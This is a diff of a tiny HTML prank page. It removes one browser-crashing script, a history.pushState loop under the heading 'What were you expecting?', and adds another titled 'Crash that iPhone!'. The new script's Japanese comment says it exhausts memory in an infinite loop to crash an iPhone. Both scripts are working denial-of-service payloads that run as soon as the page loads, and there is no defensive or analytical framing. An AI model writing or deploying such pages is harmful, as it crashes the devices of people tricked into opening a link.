@@ -1,13 +1,16 @@
-<!DOCTYPE html>
 <html>
-  <body>
-    <h1>What were you expecting?</h1>
-    <script>
-        var total = "";
-        for( var i = 0; i < 100000; i++ ) {
-            total = total + i.toString();
-            history.pushState(0,0, total );
-        }
-    </script>
-  </body>
+<head>
+<title>Crash that iPhone!</title>
+</head>
+<body>
+<script>
+// 無限ループでメモリを消費し、iPhoneをクラッシュさせる
+while (true) {
+var array = new Array(10000000);
+for (var i = 0; i < array.length; i++) {
+array[i] = Math.random();
+}
+}
+</script>
+</body>
 </html>
